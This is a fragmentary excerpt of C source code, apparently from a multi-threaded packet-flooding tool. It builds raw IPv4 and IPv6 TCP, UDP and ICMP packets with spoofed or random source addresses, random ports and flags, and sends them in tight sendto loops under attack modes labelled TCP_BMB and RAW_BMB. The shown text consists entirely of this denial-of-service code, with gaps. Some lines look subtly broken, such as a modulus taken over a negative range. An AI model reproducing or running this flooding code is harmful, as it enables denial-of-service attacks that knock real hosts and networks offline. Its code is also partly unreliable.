...
void handle_exit () {
int packets;
packets = thread_data_array[1].packets + thread_data_array[2].packets + thread_data_array[4].packets +
thread_data_array[8].packets + thread_data_array[16].packets
+ thread_data_array[32].packets + thread_data_array[64].packets + thread_data_array[128].packets +
thread_data_array[256].packets
+ thread_data_array[512].packets + thread_data_array[1024].packets + thread_data_array[2048].packets +
...
ip->ip_off = 0;
ip->ip_ttl = 255;
ip->ip_dst.s_addr = thread_data_array[0].dst_class != NULL ? inet_addr(class2ip(thread_data_array[0].dst_class))
: thread_data_array[0].dstaddr;
ip->ip_src.s_addr = thread_data_array[0].src_class != NULL ? inet_addr(class2ip(thread_data_array[0].src_class))
: random();
...
/* Filling TCP header */
packet.tcp.th_win = thread_data_array[0].window_size == 0 ? htons(rand()%(1-65535)+1) :
htons(thread_data_array[0].window_size);
...
packet.tcp.th_flags = (rand()%(TH_ACK-TH_FIN))+TH_FIN;
...
(thread_data_array[0].s_hport - thread_data_array[0].s_lport +
1)));
packet.tcp.th_dport = thread_data_array[0].d_lport == 0 ?
random () :
htons(thread_data_array[0].d_lport + (random() %
(thread_data_array[0].d_hport - thread_data_array[0].d_lport +
1)));
...
packet.tcp.th_sum = xchecksum((void *)&checksum, sizeof(checksum));
param2->packets++;
} while (sendto(param2->socket, &packet6.tcp, (sizeof packet6), 0, (struct sockaddr
*)&thread_data_array[0].destination6,sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
...
param2->packets++;
} while (sendto(param2->socket, &packet, (sizeof packet), 0, (struct sockaddr
*)&thread_data_array[0].destination4,sizeof(thread_data_array[0].destination4)) );
...
param2->packets++;
} while (sendto(param2->socket, &packet6, (sizeof packet6), 0, (struct sockaddr
*)&thread_data_array[0].destination6,sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
...
param2->packets++;
} while (sendto(param2->socket, &packet6.icmp, (sizeof packet6), 0, (struct sockaddr
*)&thread_data_array[0].destination6,sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
...
inject(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&packet.ip, sizeof(packet));
/* Filling UDP header -> it fills itself like icmp */
packet.udp.uh_ulen = htons(sizeof packet.udp);
packet.udp.uh_sum = 0;
}
} else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1) {
...
if(param2->a_flags == TCP_BMB)
checksum.pseudo.ptcl = IPPROTO_TCP;
else if(param2->a_flags == RAW_BMB) checksum.pseudo.ptcl = IPPROTO_RAW;
checksum.pseudo.tcpl = sizeof(struct tcphdr);
/* Filling TCP header */
packet6.tcp.th_win = htons(65535);
packet6.tcp.th_seq = random();
...
while ( (n = getopt(argc, argv, "46T:B:IUh:d:s:t:p:q:w:")) != -1) {
char *p;
...
if ( (!thread_data_array[0].flag4 && !thread_data_array[0].flag6) || (!thread_data_array[0].a_flags) ||
...
if ( thread_data_array[i].a_flags <= TCP_FRG || thread_data_array[i].a_flags == RAW_BMB ||
...
NULL ? thread_data_array[0].dst_class
:inet_ntop(AF_INET,&thread_data_array[0].destination4.sin_addr,thread_data_array[0].DestIP4,
sizeof(thread_data_array[0].DestIP4)),thread_data_array[0].src_class != NULL ? thread_data_array[0].src_class
:"random",thread_data_array[0].a_flags, thread_data_array[0].timeout);
...
NULL ? thread_data_array[0].dst_class :
inet_ntop(AF_INET6,&thread_data_array[0].destination6.sin6_addr,thread_data_array[0].DestIP6,
sizeof(thread_data_array[0].DestIP6)),thread_data_array[0].src_class,thread_data_array[0].a_flags,thread_data_array[0].timeout);
printf("[FLAGS] (%d)\n\n", thread_data_array[0].a_flags);
}
